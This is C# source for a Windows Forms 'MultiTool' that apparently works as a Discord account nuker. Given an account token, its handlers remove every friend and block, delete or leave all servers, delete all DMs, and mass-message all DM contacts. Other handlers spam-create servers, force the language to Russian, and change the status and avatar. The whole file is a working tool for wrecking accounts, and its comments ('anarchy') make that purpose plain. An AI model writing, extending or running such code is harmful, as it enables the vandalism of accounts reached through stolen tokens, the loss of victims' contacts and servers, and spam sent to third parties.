using System;
using System.Drawing;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using DiscordRPC;
using DiscordRPC.Logging;
using Discord;
using Discord.Gateway;

//omg free pingers only 4.99$
using System.Net.Sockets;
using System.IO;
using System.Net.NetworkInformation;
using System.Threading;

namespace MultiTool
{
    public partial class Form1 : MetroFramework.Forms.MetroForm
    {
        [Obsolete]
        public Form1()
        {
            InitializeComponent();
            this.StyleManager = metroStyleManager1;
            Region = System.Drawing.Region.FromHrgn(CreateRoundRectRgn(0, 0, Width, Height, 20, 20));
        }

        //epic round low quality edges
        [DllImport("Gdi32.dll", EntryPoint = "CreateRoundRectRgn")]

        private static extern IntPtr CreateRoundRectRgn
        (
        int nLeftRect,
        int nTopRect,
        int nRightRect,
        int nBottomRect,
        int nWidthEllipse,
        int nHeightEllipse
        );

        //epic close button
        private void label1_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void label1_MouseEnter(object sender, EventArgs e)
        {
            label1.ForeColor = Color.FromArgb(192, 0, 192);
        }

        private void label1_MouseLeave(object sender, EventArgs e)
        {
            label1.ForeColor = Color.White;
        }

        //so you can move this shit
        protected override void OnMouseDown(MouseEventArgs e)

        {
            base.OnMouseDown(e);
            if (e.Button == MouseButtons.Left)
            {
                this.Capture = false;
                Message msg = Message.Create(this.Handle, 0XA1, new IntPtr(2), IntPtr.Zero);
                this.WndProc(ref msg);
            }
        }
        //anarchy
        //remove friends
        private void metroButton10_Click(object sender, EventArgs e)
        {
            if (!checkiftoken())
            {
                return;
            }
            string token = (metroTextBox13.Text);

            DiscordClient client = new DiscordClient(token);

            foreach (var relationship in client.GetRelationships())
            {                
                        
                if (relationship.Type == RelationshipType.Friends)
                relationship.Remove();
                        
                if (relationship.Type == RelationshipType.IncomingRequest)
                relationship.Remove();

                if (relationship.Type == RelationshipType.OutgoingRequest)
                relationship.Remove();

                if (relationship.Type == RelationshipType.Blocked)
                relationship.Remove();
            }
            
        }

        //leave guilds
        private void metroButton9_Click(object sender, EventArgs e)
        {
            if (!checkiftoken())
            {
                return;
            }
            string token = (metroTextBox13.Text);

            DiscordClient client = new DiscordClient(token);
            
            foreach (var guild in client.GetGuilds())
            {
                if (guild.Owner)
                    guild.Delete();

                else
                    guild.Leave();

                System.Threading.Thread.Sleep(100);

            }
        }

        //close dms
        private void metroButton13_Click(object sender, EventArgs e)
        {
            if (!checkiftoken())
            {
                return;
            }
            string token = (metroTextBox13.Text);

            DiscordClient client = new DiscordClient(token);

            foreach (var dm in client.GetPrivateChannels())
            {
                dm.Delete();
            }
        }

        //message everyone
        private void metroButton12_Click(object sender, EventArgs e)
        {
            if (!checkiftoken())
            {
                return;
            }
            string token = (metroTextBox13.Text);

            DiscordClient client = new DiscordClient(token);

            try
            {
                foreach (var dm in client.GetPrivateChannels())
                {
                    dm.SendMessage(metroTextBox17.Text);
                }
            }
            catch
            {
                MessageBox.Show("are you sure you have permission to send messages to that user?");
            }

        }
        
        //guild creator
        private void metroTrackBar2_Scroll(object sender, ScrollEventArgs e)
        {
            metroLabel25.Text = metroTrackBar2.Value.ToString();
        }

        private void metroButton14_Click(object sender, EventArgs e)
        {
            OpenFileDialog fileSelect = new OpenFileDialog();
            if (fileSelect.ShowDialog() == DialogResult.OK)
            {
                this.avatar = fileSelect.FileName;
            }
        }

        private string avatar = "";

        private void metroButton11_Click(object sender, EventArgs e)
        {
            if (!checkiftoken())
            {
                return;
            }
            string token = (metroTextBox13.Text);

            DiscordClient client = new DiscordClient(token);

            string guildname = metroTextBox14.Text;

            int repeat = metroTrackBar2.Value;
            
            if (avatar == "")
            {
                MessageBox.Show("please select an icon first");
                return;
            }

            if (metroTextBox14.Text == "")
            {
                MessageBox.Show("please provide a guild name");
                return;
            }

            for (int i = 0; i < repeat; i++)
            {
                try
                {
                    client.CreateGuild(guildname, Image.FromFile(avatar), "russia");
                }
                
                catch{}
            }
            
        }
        
        //check if token
        private bool checkiftoken()
        {
            if (metroTextBox13.Text == "")
            {
                MessageBox.Show("please enter a token");
                return false;
            }
            
            return true;
        }

        //change language to russian
        private void metroButton18_Click(object sender, EventArgs e)
        {
            if (!checkiftoken())
            {
                return;
            }
            string token = (metroTextBox13.Text);

            DiscordClient client = new DiscordClient(token);

            client.User.ChangeSettings(new UserSettingsProperties() { Language = DiscordLanguage.Russian });
        }

        //change status
        private void metroButton16_Click(object sender, EventArgs e)
        {
            if (!checkiftoken())
            {
                return;
            }
            string token = (metroTextBox13.Text);

            DiscordClient client = new DiscordClient(token);
            client.User.ChangeSettings(new UserSettingsProperties()
            {
                CustomStatus = new CustomStatus() { Text = metroTextBox15.Text }
            });
        }

        //change pfp
        
        private void metroButton15_Click(object sender, EventArgs e)
        {
            OpenFileDialog fileSelect = new OpenFileDialog();
            if (fileSelect.ShowDialog() == DialogResult.OK)
            {
                this.profile = fileSelect.FileName;
            }
        }
        
        private string profile = "";

        private void metroButton17_Click(object sender, EventArgs e)
        {
            if (!checkiftoken())
            {
                return;
            }
            string token = (metroTextBox13.Text);

            DiscordClient client = new DiscordClient(token);
            
            if(profile == "")
            {
                MessageBox.Show("please select an image");
                return;
            }
            
            else
            {
                client.User.ChangeProfile(new UserProfileUpdate() { Avatar = Image.FromFile(profile) });
            }
        }
    }
}